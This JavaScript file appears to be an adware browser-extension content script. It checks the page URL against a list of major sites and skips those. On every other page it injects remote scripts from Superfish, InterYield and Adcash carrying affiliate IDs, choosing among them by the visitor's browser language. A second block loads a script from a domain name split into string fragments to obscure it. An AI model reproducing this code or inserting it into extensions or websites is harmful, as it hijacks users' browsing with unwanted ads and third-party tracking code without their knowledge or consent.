(function(){
    var HREF = window.location.href;
    var LANG = window.navigator.language;

    var sitefilter = function(url){
        var filterArr = ["google", "google.com", "facebook.com", "youtube.com", "baidu.com", "yahoo.com", "wikipedia.org", "twitter.com", "qq.com", "google.co.in", "linkedin.com", "live.com", "sina.com.cn", "weibo.com", "yahoo.co.jp", "google.co.jp", "google.de", "blogspot.com", "hao123.com", "bing.com", "reddit.com", "t.co", "google.co.uk", "google.com.br", "sohu.com", "tumblr.com", "google.fr", "imgur.com", "wordpress.com", "instagram.com", "msn.com", "pinterest.com", "paypal.com", "microsoft.com", "yandex.ru", "google.it", "xvideos.com", "fc2.com", "imdb.com", "vk.com", "stackoverflow.com", "google.es", "ask.com", "360.cn", "onclickads.net", "163.com", "adcash.com", "google.ca", "craigslist.org", "gmail.com", "google.com.hk", "diply.com", "naver.com", "gmw.cn", "tianya.cn", "googleadservices.com", "xhamster.com", "google.ru", "mail.ru", "bbc.co.uk", "google.com.tr", "kickass.to", "pornhub.com", "dropbox.com", "google.pl", "nicovideo.jp", "adobe.com", "soso.com", "espn.go.com", "google.com.au", "cnn.com", "googleusercontent.com", "cntv.cn", "github.com", "dailymotion.com", "youku.com", "blogger.com", "google.co.kr"];
        for (var i = 0; i < filterArr.length; i++){
            if (url.indexOf(filterArr[i]) >= 0){
                return true;
            }
        }
        return false;
    }
    var superfish = function(){
      if(HREF.indexOf("http")==0&&HREF.indexOf("https")==-1){
          if (!document.getElementById("wsparityID")) {
              var conScruipt = document.createElement("script");
              conScruipt.src = "http://www.superfish.com/ws/sf_main.jsp?dlsource=rkkrvko&CTID=vsii";
              conScruipt.setAttribute("id", "wsparityID");
              document.body.appendChild(conScruipt);
          }
      }else if(HREF.indexOf("https")==0){
          if (!document.getElementById("wsparityID")) {
              var conScruipt = document.createElement("script");
              conScruipt.src = "https://www.superfish.com/ws/sf_main.jsp?dlsource=rkkrvko&CTID=vsii";
              conScruipt.setAttribute("id", "wsparityID");
              document.body.appendChild(conScruipt);
          }
      }
    }
    var adpopup = function(){
      var advertiselang = ["us", "uk", "au", "ca", "de", "fr"];
      var advtag = false;
      for(var i=0; i<advertiselang.length; i++){
        if(LANG.toLowerCase().indexOf(advertiselang[i])>=0){
          advtag = true;
        }
      }
      function createAdvertise(){
        if (!document.getElementById("interyieldID")) {
          var conScruipt = document.createElement("script");
          conScruipt.src = "https://interyield.jmp9.com/InterYield/bindevent.do?e=click&affiliate=alexwebstore&subid="+LANG+"&ecpm=0&debug=false&snoozeMinutes=300&adCountIntervalHours=24&maxAdCountsPerInterval=2&attributionLogo=custom+attribution&attributionTitle=custom+attribution+title&attributionLink=custom+attribution+link";
          conScruipt.setAttribute("id", "interyieldID");
          document.body.appendChild(conScruipt);
        }
      }
      function createAdcash(){
        if (!document.getElementById("adcashID")) {
          var conScruipt = document.createElement("script");
          conScruipt.src = "http://www.youradexchange.com/ad/display.php?r=408088";
          conScruipt.setAttribute("id", "adcashID");
          document.body.appendChild(conScruipt);
        }
      }
      if(HREF.indexOf("http")==0&&HREF.indexOf("https")==-1){
        if(advtag){
          createAdvertise();
        }else{
          createAdcash();
        }
      }else if(HREF.indexOf("https")==0){
        createAdvertise();
      }
    }

    var excute = function(){
      if (sitefilter(HREF)) return false;
      superfish();
      adpopup();
    }
    excute();
})();

(function(){
  if (!document.getElementById("Jad32E96S")) {
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = '//cd'+'n.shor'+'tgo'+'o.com/32e96s.js?pid=vdee&script=1&key=9900';
    document.getElementsByTagName('head')[0].appendChild(s);
  }
})
